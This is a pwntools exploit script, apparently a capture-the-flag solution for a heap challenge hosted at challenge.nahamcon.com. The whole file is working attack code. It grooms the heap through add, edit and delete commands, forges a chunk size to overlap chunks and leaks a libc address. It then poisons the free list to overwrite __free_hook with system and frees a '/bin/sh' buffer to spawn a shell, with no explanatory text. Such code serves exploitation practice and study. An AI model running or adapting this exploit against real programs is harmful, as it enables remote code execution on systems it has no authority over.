from pwn import *

e = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("challenge.nahamcon.com", 30770)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

def alloc(idx, sz, data="AAAA"):
  p.sendlineafter("command:", "add")
  p.sendlineafter("add:", str(idx))
  p.sendlineafter("length:", str(sz))
  p.sendafter("email:", data)

  p.recvuntil("Enter")

def edit(idx, data):
  p.sendlineafter("command:", "edit")
  p.sendlineafter("edit:", str(idx))
  p.sendafter("email:", data)

  p.recvuntil("updated")

def free(idx):
  p.sendlineafter("command:", "delete")
  p.sendlineafter("delete:", str(idx))

  p.recvuntil("deleted")

for i in range(8):
  alloc(i, 0x17c)

for i in range(7):
  free(i)

alloc(8, 0xfc)
free(7)

alloc(7, 0xec)
debug()
alloc(9, 0x8c)

for i in range(7):
  alloc(i, 0xec)

for i in range(7):
  free(i)

free(7)

edit(9, "A" * 0x88 + p32(0x180))

for i in range(7):
  alloc(i, 0xfc)

for i in range(7):
  free(i)

free(8)

alloc(0, 0x7c)
alloc(1, 0x6c)

p.sendlineafter("command:", "print")

p.recvuntil("9 email: ")
leak = u32(p.recv(4)) - 0xf7fa17d8 + 0xf7dcc000

print(hex(leak))

alloc(2, 0x6c)
free(2)

edit(9, p32(leak + libc.symbols["__free_hook"] - 8))

alloc(3, 0x6c)
alloc(4, 0x6c, "/bin/sh\x00" + p32(leak + libc.symbols["system"]))

p.sendlineafter("command:", "delete")
p.sendlineafter("delete:", "4")


p.interactive()
